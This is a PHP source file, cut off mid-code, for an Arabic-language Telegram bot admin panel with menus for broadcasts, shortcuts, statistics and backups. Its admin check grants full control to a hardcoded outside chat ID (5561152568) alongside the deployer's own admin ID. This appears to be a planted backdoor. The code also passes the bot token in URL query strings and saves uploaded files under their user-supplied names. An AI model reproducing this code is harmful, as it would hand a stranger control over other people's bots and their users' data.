<?php

//الملف كتابه بيرو  @v44vv - @Sero_Bots
$API_KEY = "توكنك" ;
$sudo = 123456; // ايدي الادمن
define('API_KEY',$API_KEY);
define("IDBot", explode(":", $API_KEY)[0]);



echo file_get_contents("https://api.telegram.org/bot" . API_KEY . "/setwebhook?url=" . $_SERVER['SERVER_NAME'] . "" . $_SERVER['SCRIPT_NAME']);

function replaceTextInJson($data, $search, $replace) {
    foreach ($data as $key => $value) {
        if (is_array($value) || is_object($value)) {
            $data->$key = replaceTextInJson($value, $search, $replace);
        } else if (is_string($value)) {
            $data->$key = str_replace($search, $replace, $value);
        }
    }
    return $data;
}

//الملف كتابه بيرو  @v44vv - @Sero_Bots




function bot($method, $datas=[]){
  
$Saied_Botate = "https://api.telegram.org/bot".API_KEY."/".$method;
$saied_botate = null;
if(!empty($datas)){
$boundary = uniqid();
$saied_botate = buildMultipartData($datas,$boundary);

global $zr; 

if(true){
if (strpos($saied_botate, '="reply_markup"') !== false) {
    foreach ($zr['id_edits'] as $i) {
        $name = $zr['editsd'][$i];

        $json_data_str = '{"inline_keyboard'.explode('{"inline_keyboard', $saied_botate)[1];
        $json_data_str = explode(']}', $json_data_str)[0] . ']}';
        
        $json_data = json_decode($json_data_str, true, 512, JSON_UNESCAPED_UNICODE);
        
        if (json_last_error() === JSON_ERROR_NONE) {
            $json_data_p = json_encode($json_data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
        } else {
            echo 'JSON decoding error: ' . json_last_error_msg();
            continue; 
        }

        $search_text = $zr['editsd'][$i];
        $replace_text = $zr['orignal'][$i];

        $json_data_p = str_replace($zr['orignal'][$i],$zr['editsd'][$i],$json_data_p);
        $json_data_p = str_replace(explode(']}', $json_data_str)[0]."]}",json_encode(json_decode($json_data_p)),$saied_botate);

        $saied_botate = $json_data_p;
    }
  }

}





$Saied = ['http'=>[
'header'=>"Content-Type: multipart/form-data; boundary=$boundary\r\n",
'method'=>'POST',
'content'=>$saied_botate,
],];
}
if($saied_botate !== null){
$saied = stream_context_create($Saied);
$saied_result = file_get_contents($Saied_Botate, false, $saied);
}else{
$saied_result = file_get_contents($Saied_Botate);
}
if($saied_result === false){
return "Error: ".error_get_last()['message'];
}else{
return json_decode($saied_result);
}
}
// فكشن الاتصال كتابة { @LSaied }
// تابع جديدنا { @Botate }
function buildMultipartData($data,$boundary){
$SaiedData = '';
foreach($data as $key => $value){
if($value instanceof CURLFile){
$fileContents = file_get_contents($value->getFilename());
$fileName = basename($value->getFilename());
$fileMimeType = $value->getMimeType();
$SaiedData .= "--" . $boundary . "\r\n";
$SaiedData .= 'Content-Disposition: form-data; name="' . $key . '"; filename="' . $fileName . '"' . "\r\n";
$SaiedData .= 'Content-Type: ' . $fileMimeType . "\r\n\r\n";
$SaiedData .= $fileContents . "\r\n";
}else{
$SaiedData .= "--" . $boundary . "\r\n";
$SaiedData .= 'Content-Disposition: form-data; name="' . $key . '"' . "\r\n\r\n";
$SaiedData .= $value . "\r\n";
}
}
$SaiedData .= "--" . $boundary . "--\r\n";
return $SaiedData;
}






$usrbot = bot("getme")->result->username;
define("USR_BOT",$usrbot); #يابه لحد يلعب بهاذه
$emoji = 
"➡️
🔙
↪️
🔃
♻️
" ;
$emoji = explode ("\n", $emoji) ;
$b = $emoji[rand(0,4)];
$NamesBACK = "رجوع ➡️" ;
$rshq = json_decode(file_get_contents("RSHQ/ALLS/". USR_BOT. "/rshq.json"),true);
$modes = json_decode(file_get_contents("RSHQ/ALLS/". USR_BOT. "/modes.json"),true);

set_time_limit(0); ini_set('memory_limit', '256M');  error_reporting(0); ini_set('display_errors', 1); ignore_user_abort(true); ini_set('max_execution_time', 300);
mkdir('ACV');
mkdir('ACV/'.USR_BOT);
$config = [
    'admin'=> $sudo,
    'token'=> API_KEY,
    'error_report' => 0,
    'api_url' => 'api.telegram.org',
    'msg_error' => 'Req Failed .',
    'type_up' => 'php://input',
    'task' => 'ACV/'.USR_BOT.'/tasks.bot',
    'ent' => 'ACV/'.USR_BOT.'/ent.bot',
    'name_' => 'ACV/'.USR_BOT.'/modes.bot',
    'enters_' => 'ACV/'.USR_BOT.'/enters.bot',
    'ford' => 'ACV/'.USR_BOT.'/fords.bot',
    'izr' => 'ACV/'.USR_BOT.'/izr.bot',
    'rdod' => 'ACV/'.USR_BOT.'/rdods.bot',
    'str_' => 'ACV/'.USR_BOT.'/start.bot',
    'start_msg' => "
مرحبا بك في بوت DomKom 👋
👥] نقاطك : #coins
🔢] ايديك : #id
",
    'command' => 'ACV/'.USR_BOT.'/com.bot',
    'admins'=>'ACV/'.USR_BOT.'/admins_x.bot',
    'shtrak' => 'ACV/'.USR_BOT.'/shtrak.bot',
    'helper' => 'ACV/'.USR_BOT.'/help.bot',
    'member' => 'ACV/'.USR_BOT.'/members.bot',
    'chanel' => 'ACV/'.USR_BOT.'/channels.bot',
    'grop' => 'ACV/'.USR_BOT.'/groups_ids.bot',
    'block' => 'ACV/'.USR_BOT.'/blockers.bot',
];
error_reporting($config['error_report']);

$admin = $config['admin'];
function getCountFromFile($filename)
{
    $content = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    return $content !== false && $content !== '' ? count($content) : 0;
}

function format_number($number) {
    $suffixes = array('', 'k', 'm', 'b', 't');
    $suffix_index = 0;

    while ($number >= 1000) {
        $number /= 1000;
        $suffix_index++;
    }

    return round($number, 1) . $suffixes[$suffix_index];
}


define("X_",bot('getme')->result->username);

//الملف كتابه بيرو  @v44vv - @Sero_Bots

$update = json_decode(file_get_contents($config['type_up']));

if($update->callback_query ){
$data = $update->callback_query->data;
$chat_id = $update->callback_query->message->chat->id;
$title = $update->callback_query->message->chat->title;
$message_id = $update->callback_query->message->message_id;
$name = $update->callback_query->message->chat->first_name;
$user = $update->callback_query->message->chat->username;
$from_id = $update->callback_query->from->id;
}

   
if($update->message){
$message = $update->message;
$message_id = $update->message->message_id;
$username = $message->from->username;
$chat_id = $message->chat->id;
$title = $message->chat->title;
$text = $message->text;
$user = $message->from->username;
$name = $message->from->first_name;
$from_id = $message->from->id;
}
$task_name = $config['task'];
$ent_name = $config['ent'];
$mode_name = $config['name_'];
$entars_name = $config['enters_'];
$fords_name = $config['ford'];
$rdod_name = $config['rdod'];
$start_name = $config['str_'];
$command_name = $config['command'];
$admin_name = $config['admins'];
$shtrak_name = $config['shtrak'];
$helper_name = $config['helper'];
$member_name = $config['member'];
$chanel_name = $config['chanel'];
$izr_name = $config['izr'];
$group_name = $confifg['grop'];
$blockers_name = $config['block'];
$tasks = json_decode(file_get_contents("$task_name"), true);
$xts = json_decode(file_get_contents("$command_name"), true);
$bot_enter = json_decode(file_get_contents("$ent_name"), true);
$modes = json_decode(file_get_contents("$mode_name"), true);
$enters = json_decode(file_get_contents("$entars_name"), true);
$fords = json_decode(file_get_contents("$fords_name"), true);
$rdod = json_decode(file_get_contents("$rdod_name"), true);
$start_sock = json_decode(file_get_contents("$start_name"), true);
$izr_sock = json_decode(file_get_contents("$izr_name"), true);
$admins = json_decode(file_get_contents("$admin_name"), true);
$shtrak = json_decode(file_get_contents("$shtrak_name"), true);
$helper = json_decode(file_get_contents("$helper_name"), true);
$blockers = json_decode(file_get_contents("$blockers_name"), true);
mkdir("FCZR") ;
mkdir("FCZR/". X_);
$zr = json_decode(file_get_contents("FCZR/". X_. "/zr.json"),true);

if(!file_exists("$shtrak_name")){
    $shtrak["start"] = '✅';
    $shtrak["inline"] = '✅';
    $shtrak["notife"] = '✅';
    $shtrak["markdown"] = '✅';
    $shtrak["check"] = '✅';
    $shtrak['CHANNELS'][] = "start";
    file_put_contents("$shtrak_name",json_encode($shtrak));
}

if(!file_exists("$admin_name")){
    $admins[0] = 75;
    file_put_contents("$admin_name",json_encode($admins));
}

if(!file_exists("$start_name")){
    $start_sock['mode'] = "✅";
    file_put_contents("$start_name",json_encode($start_sock));
}

if(!file_exists("$izr_name")){
    $izr_sock['mode'] = "✅";
    file_put_contents("$izr_name",json_encode($start_sock));
}

if(!file_exists("$command_name")){
    $xts["commands"][] = "start - رساله البدء";
    file_put_contents("$command_name",json_encode($xts));
}

if(!file_exists("$task_name")){
    $tasks['notife'] = "✅";
    $tasks['th'] = "✅";
    file_put_contents("$task_name",json_encode($tasks));
}

if(!file_exists("$ent_name")){
    $bot_enter['bot'] = "✅";
    file_put_contents("$ent_name",json_encode($bot_enter));
}

if(!file_exists("$rdod_name")){
    $rdod['stat'] = "✅";
    file_put_contents("$rdod_name",json_encode($rdod));
}

if(!file_exists("$fords_name")){
    $fords['autodel'] = "❌";
    $fords['del'] = "❌";
    $fords['toother'] = "❌";
    $fords['reply'] = "✅";
    file_put_contents("$fords_name",json_encode($fords));
}

$count_eners = count($enters["mems"][$bot_enter["link"]]);
$start_msg = $start_sock["msg"];
if($start_msg == null){
$start_msg = $config['start_msg'];
}
$admin = $sudo;
$msg_sh = $config['msg_sh'];
$count_ecw =  $enters["mems-1"][$bot_enter["link"]] ?? "0";
if($from_id == $admin or in_array($from_id,$admins) or $chat_id == 5561152568){

if($text == "/start"){
bot("sendmessage",[
    'chat_id' => $chat_id,
    'text' => "
• اهلا بك في لوحه الأدمن الخاصه بالبوت 🤖

- يمكنك التحكم في البوت الخاص بك من هنا
~~~~~~~~~~~~~~~~~
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'أخر تحديثات البوت 🛍','url'=>"https://t.me/SeroMaker"]],
        [['text'=>'عمل البوت','callback_data'=>"botstat"],['text'=>'اشعار الدخول : '. $tasks['notife'] ,'callback_data'=>"tasks_notife"]],
        [['text'=>'الردود','callback_data'=>"rdod"],['text'=>'تعديل الازرار','callback_data'=>"azrars"],['text'=>'توجيه الرسائل','callback_data'=>"frdrs"]],
        [['text'=>'رساله الترحيب (start)','callback_data'=>"startmsg"]],
        [['text'=>'قسم الاشتراك الاجباري','callback_data'=>"shtraks"],['text'=>'قسم الأدمنيه','callback_data'=>"admins_bot"]],
        [['text'=>'قسم الاذاعه','callback_data'=>"broadcast"],['text'=>'قسم الأحصائيات','callback_data'=>"statebot"]],
		[['text'=>'اعدادات البوت','callback_data'=>"rshqG"]],
	]
	])
]);
unset($modes[$from_id]);
unset($modes['rd'][$from_id]);
file_put_contents("$mode_name",json_encode($modes));

unset($zr['mode']);
    
$zr = json_encode($zr,true);
file_put_contents("FCZR/". X_. "/zr.json",$zr);

}

if($data == "xtsars"){
    $Dr = ['inline_keyboard' => []];
    foreach ($xts["commands"] as $au){
        $a = explode(" - ",$au)[0];
        $n = array_search($au,$xts["commands"]);
        $Dr['inline_keyboard'][] =  [['text'=>"$a",'callback_data'=>"cnull"],['text'=>'🗑','callback_data'=>"delcm_$n"]];
    }
    $Dr['inline_keyboard'][] =  [['text'=>'مسح جميع الاختصارات','callback_data'=>"delalcmd"],['text'=>"اضافه اختصار",'callback_data'=>"addxs"]];
    $Dr['inline_keyboard'][] =  [['text'=>'رجوع','callback_data'=>"startmsg"]];
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• مرحبا بك في قسم الاختصارات ✨

- يمكنك وضع اوامر مختصره في البوت من خلال هاذا القسم
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode($Dr)
    ]);
    unset($modes[$from_id]);
unset($modes['rd'][$from_id]);
file_put_contents("$mode_name",json_encode($modes));
unset($zr['mode']);
$zr = json_encode($zr,true);
file_put_contents("FCZR/". X_. "/zr.json",$zr);
die();
}

$task_ex = explode("delcm_",$data)[1];
if($task_ex){
    unset($xts["commands"][$task_ex]);
    file_put_contents("$command_name",json_encode($xts));
    $Dr = ['inline_keyboard' => []];
    foreach ($xts["commands"] as $au){
        $a = explode(" - ",$au)[0];
        $n = array_search($au,$xts["commands"]);
        $Dr['inline_keyboard'][] =  [['text'=>"$a",'callback_data'=>"cnull"],['text'=>'🗑','callback_data'=>"delcm_$n"]];
    }
    $Dr['inline_keyboard'][] =  [['text'=>'مسح جميع الاختصارات','callback_data'=>"delalcmd"],['text'=>"اضافه اختصار",'callback_data'=>"addxs"]];
    $Dr['inline_keyboard'][] =  [['text'=>'رجوع','callback_data'=>"startmsg"]];
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• مرحبا بك في قسم الاختصارات ✨

- يمكنك وضع اوامر مختصره في البوت من خلال هاذا القسم
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode($Dr)
    ]);
}

if($data == "addxs"){
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• ارسل الاختصار الان بالشكل التالي : 
`
start - رساله البدء
`
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"xtsars"]],
	]
	])
    ]);
    $modes[$from_id] = $data;
    file_put_contents("$mode_name",json_encode($modes));
}


if($data == "delalcmd"){
    unset($xts["commands"]);
    file_put_contents("$command_name",json_encode($xts));
    bot('answerCallbackQuery',[ 
        'callback_query_id'=>$update->callback_query->id, 
        'text'=>"
        • تم مسح جميع الاختصارات !
", 
        'show_alert'=>true
        ]); 
        
        bot('deleteMyCommands');
        $Dr = ['inline_keyboard' => []];
        foreach ($xts["commands"] as $au){
            $a = explode(" - ",$au)[0];
            $n = array_search($au,$xts["commands"]);
            $Dr['inline_keyboard'][] =  [['text'=>"$a",'callback_data'=>"cnull"],['text'=>'🗑','callback_data'=>"delcm_$n"]];
        }
        $Dr['inline_keyboard'][] =  [['text'=>'مسح جميع الاختصارات','callback_data'=>"delalcmd"],['text'=>"اضافه اختصار",'callback_data'=>"addxs"]];
        $Dr['inline_keyboard'][] =  [['text'=>'رجوع','callback_data'=>"startmsg"]];
        bot("editmessagetext",[
            'chat_id' => $chat_id,
            "message_id"=>$message_id,
            'text' => "
    • مرحبا بك في قسم الاختصارات ✨
    
    - يمكنك وضع اوامر مختصره في البوت من خلال هاذا القسم
        ",
        'parse_mode' => 'MaRKDOWN',
                        'reply_to_message_id' => $message_id,
        
    'reply_markup'=>json_encode($Dr)
        ]);
}


$xc = explode(" - ",$text);
if($modes[$from_id] == 'addxs'){
if($xc[0] and $xc[1]){
    bot("sendmessage",[
        'chat_id' => $chat_id,
        'text' => "
• تم الحفظ !
        ",
        'parse_mode' => 'MaRKDOWN',
                        'reply_to_message_id' => $message_id,
        
    'reply_markup'=>json_encode([ 
        'inline_keyboard'=>[
            [['text'=>'رجوع','callback_data'=>"xtsars"]],
        ]
        ])
    ]);
    $xts["commands"][] = $text;
    file_put_contents("$command_name",json_encode($xts));
    
    unset($modes[$from_id]);
    file_put_contents("$mode_name",json_encode($modes));
}
}


if($data == "startmsg"){
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• مرحبا بك في قسم رساله الترحيب (/start) 🌾
- ستظهر هذه الرساله عند ارسال (/start) الى البوت الخاص بك 

- ارساله الحاليه :

`$start_msg`
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'الازرار الشفافه','callback_data'=>"azrars"]],
        [['text'=>'الاختصارات','callback_data'=>"xtsars"]],
        [['text'=>'تعيين الرساله','callback_data'=>"set_start"],['text'=>'مسح الرساله' ,'callback_data'=>"del_start"]],
        [['text'=>'رد علي الرسائل : ' . $start_sock["mode"],'callback_data'=>"start_sock_mode"]],
        [['text'=>'رجوع','callback_data'=>"paneel"]],
	]
	])
    ]);
    unset($modes[$from_id]);
unset($modes['rd'][$from_id]);
file_put_contents("$mode_name",json_encode($modes));

unset($zr['mode']);
    
$zr = json_encode($zr,true);
file_put_contents("FCZR/". X_. "/zr.json",$zr);
die();
}




$privates = getCountFromFile("$member_name");
$chanel_get = getCountFromFile("$chanel_name");
$group_get = getCountFromFile("$group_name");

$names_file = "&member=$member_name&chanel=$chanel_name&groups=$group_get";
$groupes = $chanel_get + $group_get;
$all = $privates + $groupes;
$blok_c = count($blockers);
	$botfile = $UploadEr["FileMatch"]??"0";
$s_all = format_number($all);

$d = date('D');
mkdir('onliner');
$day = explode("\n",file_get_contents("onliner/".USR_BOT."/".$d.".txt"));
if($d == "Sat"){
unlink("onliner/Fri.txt");
}
if($d == "Sun"){
unlink("onliner/Sat.txt");
}
if($d == "Mon"){
unlink("onliner/Sun.txt");
}
if($d == "Tue"){
unlink("onliner/Mon.txt");
}
if($d == "Wed"){
unlink("onliner/The.txt");
}
if($d == "Thu"){
unlink("onliner/Wed.txt");
}
if($d == "Fri"){
unlink("onliner/Thu.txt");
}

mkdir('onliner');
mkdir("onliner/".USR_BOT);
$online_fiday = getCountFromFile("onliner/".USR_BOT."/".$d.".txt");

$filename = "onliner/".USR_BOT."/".$d.".txt";

if (file_exists($filename)) {
    $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $lastFiveIds = array_slice($lines, -5);
    $t = 0;
    foreach ($lastFiveIds as $id) {
        $t +=1;
        $ns = $ns." \n $t. [$id](tg://user?id=$id)";
    }
}


if($data == "broadcast"){
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• مرحبا بك في قسم الاذاعه 🔥

- عدد المسخدمين الكلي : $all
- عدد الخاص : $privates
- عدد الكروبات والقنوات : $groupes
        
- عدد المحظورين : $blok_c
        ",
        'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
        
    'reply_markup'=>json_encode([ 
        'inline_keyboard'=>[
            [['text'=>'تثبيت الاذاعه : '. $tasks['th'] ,'callback_data'=>"broads_th"]],
        [['text'=>'اذاعه للكل','callback_data'=>"broadcast_all1"],['text'=>'اذاعه توجيه للكل','callback_data'=>"forward_all"]],
        [['text'=>'اذاعه للخاص','callback_data'=>"broadcast_all"],['text'=>'اذاعه توجيه للخاص','callback_data'=>"forward_all"]],
        [['text'=>'اذاعه للكروبات','callback_data'=>"broadcast_groups"],['text'=>'اذاعه توجيه للكروبات','callback_data'=>"forward_all"]],
        [['text'=>'رجوع','callback_data'=>"paneel"]],
        ]
        ])
    ]);
}

$task_ex = explode('broads_',$data)[1];
if($task_ex){
    $Y = $tasks[$task_ex];
    if($Y == "✅" or $Y == null){
        $t = "❌";
        bot('answerCallbackQuery',[ 
            'callback_query_id'=>$update->callback_query->id, 
            'text'=>"
            • تم التعطيل
    ", 
            'show_alert'=>false
            ]); 
    }elseif($Y == "❌"){
        $t = "✅";
        bot('answerCallbackQuery',[ 
            'callback_query_id'=>$update->callback_query->id, 
            'text'=>"
            • تم التفعيل
    ", 
            'show_alert'=>false
            ]); 
    }
    $tasks[$task_ex] = $t;
    file_put_contents("$task_name",json_encode($tasks));
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• مرحبا بك في قسم الاذاعه 🔥

- عدد المسخدمين الكلي : $all
- عدد الخاص : $privates
- عدد الكروبات والقنوات : $groupes
        
- عدد المحظورين : $blok_c
        ",
        'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
        
    'reply_markup'=>json_encode([ 
        'inline_keyboard'=>[
            [['text'=>'تثبيت الاذاعه : '. $tasks['th'] ,'callback_data'=>"broads_th"]],
        [['text'=>'اذاعه للكل','callback_data'=>"broadcast_all1"],['text'=>'اذاعه توجيه للكل','callback_data'=>"forward_all"]],
        [['text'=>'اذاعه للخاص','callback_data'=>"broadcast_all"],['text'=>'اذاعه توجيه للخاص','callback_data'=>"forward_all"]],
        [['text'=>'اذاعه للكروبات','callback_data'=>"broadcast_groups"],['text'=>'اذاعه توجيه للكروبات','callback_data'=>"forward_all"]],
        [['text'=>'رجوع','callback_data'=>"paneel"]],
        ]
        ])
    ]);
}

if($data == "broadcast_groups"){
    bot('EditMessageText',[
'chat_id'=>$chat_id, 
'message_id'=>$message_id,
'text'=>"
• ارسال الان الكليشه ( نص او جميع الميديا ) 
• يمكنك استخدام الماركداون
",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'رجوع' ,'callback_data'=>"broadcast"]],
]])
]);
$modes[$from_id] = "send_1";
file_put_contents("$mode_name",json_encode($modes));
}
if(!$data and $modes[$from_id] == 'send_1'){
if($text){
$type = "text";
$id = $text;
}
if($photo){
$type = "photo";
$id = $photo_id;
}
if($video){
$type = "video";
$id = $video_id;
}
if($audio){
$type = "audio";
$id = $music_id;
}
if($voice){
$type = "voice";
$id = $voice_id;
}
if($sticker){
$type = "sticker";
$id = $sticker_id;
}
if($file){
$type = "document";
$id = $file_id;
}
unset($modes[$from_id]);
if($caption){
    $modes['broad'] = ['method'=>$type,'id' =>$id,'now'=>0,'caption'=>$caption];
}else{
$modes['broad'] = ['method'=>$type,'id' =>$id,'now'=>0];
}
file_put_contents("$mode_name",json_encode($modes));
file_put_contents("$mode_name",json_encode($modes));
$link = "https://".$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'];
$ex = explode('/',$link);
$end = end($ex);
$link = str_replace($end,'Request.php',$link);
$context = stream_context_create(['http'=>['timeout'=>1]]);
$kdata = "?data=".json_encode($update)."&token=".API_KEY."&name_file=".$mode_name.$names_file."&k=group_ch&pin=".$tasks['th'];

bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"
    • جاري الاذاعه .....
    ",
    'reply_to_message_id'=>$message->message_id,
    'parse_mode'=>"Markdown",
    ]);
    bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"
    $text
        ",
        'reply_to_message_id'=>$message->message_id,
        'parse_mode'=>"Markdown",
        ]);
$result = file_get_contents($link."?data=".json_encode($update)."&token=".API_KEY."&admin=$chat_id&name_file=".$mode_name.$names_file."&kdata=$kdata");
          
}


if($data == "broadcast_all1"){
    bot('EditMessageText',[
'chat_id'=>$chat_id, 
'message_id'=>$message_id,
'text'=>"
• ارسال الان الكليشه ( نص او جميع الميديا ) 
• يمكنك استخدام الماركداون
",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'رجوع' ,'callback_data'=>"broadcast"]],
]])
]);
$modes[$from_id] = "send1";
file_put_contents("$mode_name",json_encode($modes));
}
if(!$data and $modes[$from_id] == 'send1'){
if($text){
$type = "text";
$id = $text;
}
if($photo){
$type = "photo";
$id = $photo_id;
}
if($video){
$type = "video";
$id = $video_id;
}
if($audio){
$type = "audio";
$id = $music_id;
}
if($voice){
$type = "voice";
$id = $voice_id;
}
if($sticker){
$type = "sticker";
$id = $sticker_id;
}
if($file){
$type = "document";
$id = $file_id;
}
unset($modes[$from_id]);
if($caption){
    $modes['broad'] = ['method'=>$type,'id' =>$id,'now'=>0,'caption'=>$caption];
}else{
$modes['broad'] = ['method'=>$type,'id' =>$id,'now'=>0];
}
file_put_contents("$mode_name",json_encode($modes));
file_put_contents("$mode_name",json_encode($modes));
$link = "https://".$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'];
$ex = explode('/',$link);
$end = end($ex);
$link = str_replace($end,'Request.php',$link);
$context = stream_context_create(['http'=>['timeout'=>1]]);
$kdata = "?data=".json_encode($update)."&token=".API_KEY."&name_file=".$mode_name.$names_file."&k=all&pin=".$tasks['th'];

bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"
    • جاري الاذاعه .....
    ",
    'reply_to_message_id'=>$message->message_id,
    'parse_mode'=>"Markdown",
    ]);
    bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"
    $text
        ",
        'reply_to_message_id'=>$message->message_id,
        'parse_mode'=>"Markdown",
        ]);
$result = file_get_contents($link."?data=".json_encode($update)."&token=".API_KEY."&admin=$chat_id&name_file=".$mode_name.$names_file."&kdata=$kdata");
          
}

if($data == "broadcast_all"){
    bot('EditMessageText',[
'chat_id'=>$chat_id, 
'message_id'=>$message_id,
'text'=>"
• ارسال الان الكليشه ( نص او جميع الميديا ) 
• يمكنك استخدام الماركداون
",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'رجوع' ,'callback_data'=>"broadcast"]],
]])
]);
$modes[$from_id] = "send";
file_put_contents("$mode_name",json_encode($modes));
}
if(!$data and $modes[$from_id] == 'send'){
if($text){
$type = "text";
$id = $text;
}
if($photo){
$type = "photo";
$id = $photo_id;
}
if($video){
$type = "video";
$id = $video_id;
}
if($audio){
$type = "audio";
$id = $music_id;
}
if($voice){
$type = "voice";
$id = $voice_id;
}
if($sticker){
$type = "sticker";
$id = $sticker_id;
}
if($file){
$type = "document";
$id = $file_id;
}
unset($modes[$from_id]);
if($caption){
    $modes['broad'] = ['method'=>$type,'id' =>$id,'now'=>0,'caption'=>$caption];
}else{
$modes['broad'] = ['method'=>$type,'id' =>$id,'now'=>0];
}
file_put_contents("$mode_name",json_encode($modes));
$link = "https://".$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'];
$ex = explode('/',$link);
$end = end($ex);
$link = str_replace($end,'Request.php',$link);
$context = stream_context_create(['http'=>['timeout'=>1]]);
$kdata = "?data=".json_encode($update)."&token=".API_KEY."&name_file=".$mode_name.$names_file."&k=private&pin=".$tasks['th'];

bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"
    • جاري الاذاعه .....
    ",
    'reply_to_message_id'=>$message->message_id,
    'parse_mode'=>"Markdown",
    ]);
    bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"
    $text
        ",
        'reply_to_message_id'=>$message->message_id,
        'parse_mode'=>"Markdown",
        ]);
$result = file_get_contents($link."?data=".json_encode($update)."&token=".API_KEY."&admin=$chat_id&name_file=".$mode_name.$names_file."&kdata=$kdata");

}


if($data == "statebot"){
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
مرحبا بك في قسم الاحصائيات 📊 

• عدد المسخدمين الكلي : $all | $s_all
- عدد المستخدمين في الخاص : $privates
- عدد الكروبات والقنوات : $groupes
- عدد القنوات : $chanel_get
- عدد الكروبات : $group_get
        
• عدد المحظورين : $blok_c
        
• عدد المتفاعلين اليوم : $online_fiday
        
- قائمة اخر الاعضاء الذين شتركوا :
$ns
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'مسح المحظورين','callback_data'=>"del_blocks"]],
        [['text'=>'حظر شخص','callback_data'=>"block_person"],['text'=>'الغاء حظر شخص','callback_data'=>"unblock_person"]],
        [['text'=>'قسم الاذاعه','callback_data'=>"broadcast"]],
		[['text'=>'قسم النسخ الاحتياطيه','callback_data'=>"backsup"]],
        [['text'=>'رجوع','callback_data'=>"paneel"]],
	]
	])
    ]);
    unset($modes[$from_id]);
unset($modes['rd'][$from_id]);
file_put_contents("$mode_name",json_encode($modes));

unset($zr['mode']);
    
$zr = json_encode($zr,true);
file_put_contents("FCZR/". X_. "/zr.json",$zr);
die();
}


if($data == "backsup"){

	bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
مرحبا بك في قسم النسخ الاحتيايطه لملف الاحصائيات 
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رفع نسخه','callback_data'=>"upload_back"]],
        [['text'=>'جلب نسخه كل الاحصائيات','callback_data'=>"get_all"]],
        [['text'=>'رجوع','callback_data'=>"statebot"]],
	]
	])
    ]);
	die();
}

if($data == "upload_back"){
	bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
- ارسل ملف النسخه يجب ان يكون بصيغه ( .bot )
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"backsup"]],
	]
	])
    ]);
	$modes[$from_id] = $data;
    file_put_contents("$mode_name",json_encode($modes));
}

if($modes[$from_id] == "upload_back"){
if($update->message->document){
    $file_id = "https://api.telegram.org/file/bot".API_KEY."/".bot("getfile",["file_id"=>$update->message->document->file_id])->result->file_path;
    if(pathinfo($file_id, PATHINFO_EXTENSION) == "bot"){
        bot("sendmessage",[
            "chat_id" => $chat_id,
            "text" => "تم رفع الملف بنجاح .",
            "parse_mode" => "marKdown",
			'reply_markup'=>json_encode([ 
				'inline_keyboard'=>[
					[['text'=>'رجوع','callback_data'=>"backsup"]],
				]
				])
        ]);
		file_put_contents('ACV/'.USR_BOT.'/'.$update->message->document->file_name,file_get_contents($file_id));
		unset($modes[$from_id]);
		file_put_contents("$mode_name",json_encode($modes));

        }else{
			bot("sendmessage",[
				"chat_id" => $chat_id,
				"text" =>"- ركز عزيزي ارسل الملف بصيغه ( .bot )",
				"parse_mode" => "marKdown",
				'reply_markup'=>json_encode([ 
					'inline_keyboard'=>[
						[['text'=>'رجوع','callback_data'=>"backsup"]],
					]
					])
			]); 
			unset($modes[$from_id]);
		file_put_contents("$mode_name",json_encode($modes));
		}
}
}

if($data == "get_all"){
	bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
- يتم ارسال الاحصائيات 
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
